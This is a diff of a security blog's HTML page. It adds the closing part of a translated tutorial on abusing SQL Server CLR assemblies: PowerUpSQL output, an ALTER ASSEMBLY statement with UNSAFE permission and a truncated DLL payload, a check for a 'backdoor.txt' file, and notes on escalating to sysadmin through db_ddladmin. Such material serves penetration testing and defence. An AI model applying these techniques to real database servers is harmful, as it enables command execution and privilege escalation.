+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">PS C:\temp&gt; Create-SQLFileCLRDll -Verbose -SourceDllPath .\cmd_exec.dll</div><div class="line">VERBOSE: Target C<span class="comment">#  File: NA</span></div><div class="line">VERBOSE: Target DLL File: .\cmd_exec.dll</div><div class="line">VERBOSE: Grabbing bytes from the dll</div><div class="line">VERBOSE: Writing SQL to: C:\Users\SSUTHE~<span class="number">1</span>\AppData\Local\Temp\CLRFile.txt</div><div class="line">C<span class="comment"># File: NA</span></div><div class="line">CLR DLL: .\cmd_exec.dll</div><div class="line">SQL Cmd: C:\Users\SSUTHE~<span class="number">1</span>\AppData\Local\Temp\CLRFile.txt</div></pre></td></tr></table></figure>
+<p>新的cmd_exec.txt文件看起来是应该是这样的。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">-- Choose the msdb database</div><div class="line">use msdb</div><div class="line">-- Alter the existing CLR assembly</div><div class="line">ALTER ASSEMBLY [my_assembly] FROM </div><div class="line"><span class="number">0</span>x4D5A90000300000004000000F[TRUNCATED]</div><div class="line">WITH PERMISSION_SET = UNSAFE </div><div class="line">GO</div></pre></td></tr></table></figure>
+<p>Alter语句通常用于存在的CLR而不是DROP和CREATE。就像微软谈到的，”ALTER ASSEMBLY 不会中断在不停变化的assembly中运行的代码的会话。”所以，一句话概括就是不会出现异常。TSQL查询如下图所示。</p>
+<p><img src="/2017-09-14-attack-sql-server-clr/attack_sql_server_clr/15.png" alt="15"></p>
+<p>为了检验你的代码修改是否生效，请运行cmd_exec存储过程然后检测是否生成了”C:\temp\backdoor.txt”</p>
+<h2 id="我能否通过定制化的CLR进行SQL-Server提权吗？"><a href="#我能否通过定制化的CLR进行SQL-Server提权吗？" class="headerlink" title="我能否通过定制化的CLR进行SQL Server提权吗？"></a>我能否通过定制化的CLR进行SQL Server提权吗？</h2><p>当然能了，但最开始可能会遇到一些不太令人喜欢的情况。</p>
+<p>如果你不是以sysadmin登录SQL Server，但你又有CREATE和ALter ASSEMBLY权限，也许你能够在SQL Server服务账号（默认是sysadmin）下使用可以执行操作系统命令的CLR去获得sysadmin权限。然而，为了让你成功，你创建的CLR assembly所在的数据库必须设置了is_trustworthy标志为1，同时还得启用了clr enabled（也就是说不能禁用clr）。默认情况下，只有msdb数据库是可信的，并且clr enabled设置是被禁用的。</p>
+<p>我从未见过CREATE或ALTER ASSEMBLY权限明确分配给能够登录的用户。然而，我却见过应用程序的SQL登录被添加到”db_ddladmin”数据角色，并且这个角色的的确确拥有”ALTER ASSEMBLY”权限。</p>
+<p>注意，SQL Server 2017引进了clr strict security配置。微软文档讲述了该配置应被禁止防止UNSAFE或EXTERNAL assembly被创建。</p>
+<h2 id="告警"><a href="#告警" class="headerlink" title="告警"></a>告警</h2><p>本文中，我仅展示了一部分可能被滥用的CLR assemblies同时有些任务（比如导出CLR assemblies）可以通过PowerUPSQL来批量完成。值得注意的是文中的所有技术都可以被记录和用语警告（通过原生SQL Server功能），但是我期待有另外一天重提这些。除此之外，请愉快的玩耍和带有责任的hack吧。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a href="http://sekirkity.com/seeclrly-fileless-sql-server-clr-based-custom-stored-procedure-command-execution/" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/microsoft.sqlserver.server.sqlpipe.sendresultsrow(v=vs.110).aspx</a></li>
+<li><a href="http://sekirkity.com/seeclrly-fileless-sql-server-clr-based-custom-stored-procedure-command-execution/" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/system.reflection.module.moduleversionid.aspx</a></li>
+<li><a href="http://sekirkity.com/seeclrly-fileless-sql-server-clr-based-custom-stored-procedure-command-execution/" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/ff878250.aspx</a></li>
+<li><a href="http://sekirkity.com/seeclrly-fileless-sql-server-clr-based-custom-stored-procedure-command-execution/" target="_blank" rel="external">https://docs.microsoft.com/en-us/sql/t-sql/statements/create-assembly-transact-sql</a></li>
+<li><a href="http://sekirkity.com/seeclrly-fileless-sql-server-clr-based-custom-stored-procedure-command-execution/" target="_blank" rel="external">https://docs.microsoft.com/en-us/sql/t-sql/statements/alter-assembly-transact-sql</a></li>
+<li><a href="http://sekirkity.com/seeclrly-fileless-sql-server-clr-based-custom-stored-procedure-command-execution/" target="_blank" rel="external">http://sekirkity.com/seeclrly-fileless-sql-server-clr-based-custom-stored-procedure-command-execution/</a></li>
+</ul>
+<h2 id="译者参考资料"><a href="#译者参考资料" class="headerlink" title="译者参考资料"></a>译者参考资料</h2><p>1.<a href="http://blog.csdn.net/luckystar689/article/details/42559607" target="_blank" rel="external">NET 基础——CLR、BCL、DLL、Assembly</a><br>2.<a href="http://www.cnblogs.com/raker/p/4377343.html" target="_blank" rel="external">MySQL UDF（自定义函数)</a></p>
+<p>##<a href="https://blog.netspi.com/attacking-sql-server-clr-assemblies/" target="_blank" rel="external">原文</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="/talk-about-ssh-tunnel/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1032,152 +1274,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="/blind-xxe-learning/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Ꭰ">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Security blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/blind-xxe-learning/" itemprop="url">【译】黑夜的猎杀-盲打XXE</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-07-10T10:12:27+08:00">
-                2017-07-10
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Translation/" itemprop="url" rel="index">
-                    <span itemprop="name">Translation</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <p>在进入正文前，我想告诉大家，文章没有涉及任何XXE攻击的任何新技巧，这只是我遇到的一个案例，我只想分享给大家。</p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/blind-xxe-learning/#more" rel="contents">
-              Read more &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1228,7 +1324,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">40</span>
+                  <span class="site-state-item-count">41</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
